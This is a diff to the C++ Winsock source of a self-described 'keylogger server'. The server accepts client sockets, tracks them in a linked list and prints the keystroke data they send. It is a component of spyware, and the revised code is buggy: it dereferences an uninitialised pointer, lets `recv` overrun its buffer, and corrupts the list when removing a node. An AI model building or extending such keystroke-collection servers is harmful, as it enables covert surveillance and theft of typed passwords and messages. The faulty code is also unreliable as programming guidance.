@@ -8,15 +8,16 @@
 #include <io.h>
 
 std::mutex mu;
-SOCKETLIST slist;
-
+SOCKETLIST *head;
 void Listener()
 {
     WSADATA WSA;
     SOCKET Listener;
     SOCKADDR_IN server, target;
-    slist.nextTarget=0x00;
-    slist.target=0x00;
+    head= (SOCKETLIST*)malloc(sizeof(SOCKETLIST));
+    (head->nextTarget)=0x00;
+    (head->target)=0x00;
+
     int cL;
     fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
     fprintf(stderr ,"\t[*] Initalizing socket...\n");
@@ -70,15 +71,15 @@ void Listener()
                 each link contains a socket so the listener thread can read data off of the
                 socket.
             */
-            if(slist.target==0x00)
+            if((head->target)==0x00)
             {
-                slist=*link;
-                slist.nextTarget=&slist;
+                *head=*link;
+                head->nextTarget=head;
             }
             else
             {
-                link->nextTarget=slist.nextTarget;
-                slist.nextTarget=link;
+                link->nextTarget=head->nextTarget;
+                head->nextTarget=link;
             }
             mu.unlock();
 
@@ -91,18 +92,18 @@ void Handler()
 {
         unsigned int rcv;
         char* buffer = (char*)malloc(0x1000);
-        SOCKETLIST link;
+        SOCKETLIST *link;
         SOCKETLIST previousLink;
         while(1)
         {
-            while(slist.target == NULL )
+            while((head->target)== NULL )
                 Sleep(1);
-            link.nextTarget=slist.nextTarget;
-            link.target=slist.target;
-            while(slist.target!=NULL)
+            link->nextTarget=head->nextTarget;
+            link->target=head->target;
+            while((head->target)!=NULL)
             {
 
-                while(recv(*(link.target),buffer,0x1001,0) !=  SOCKET_ERROR )
+                while(recv(*(link->target),buffer,0x1001,0) !=  SOCKET_ERROR )
                 {
                         *(buffer+0x1000)=0x00;
                        printf("%s",buffer);
@@ -111,29 +112,30 @@ void Handler()
                 {
                     Sleep(1);
                     WSASetLastError(0x00);
-                    previousLink =link;
-                    link = *(link.nextTarget);
+                    link = (link->nextTarget);
                 }
                 else
                 {
                     printf("\n</KeyLoggerMetaData>\n");
-                    SOCKETLIST temp = *(link.nextTarget);
-                   if( link.target == temp.target)
+                    SOCKETLIST temp = *(link->nextTarget);
+                   if( link->target == temp.target)
                     {
                         mu.lock();
-                        slist.target=0x00;
-                        slist.nextTarget=0x00;
+                        head->target=0x00;
+                        head->nextTarget=0x00;
                         mu.unlock();
                     }
-                    else if (previousLink.target == link.nextTarget->target)
+                    else
                     {
-                        link = *(link.nextTarget);
-                        link.nextTarget= &link;
+                        mu.lock();
+                      link->target = link->nextTarget->target;
+                      link->nextTarget=link->nextTarget->nextTarget;
+                      head = link;
+                      mu.unlock();
                     }
-                    /*
-                        TODO: remove socket from linked list
-                    */
+
                 }
+
             }
         }
 }
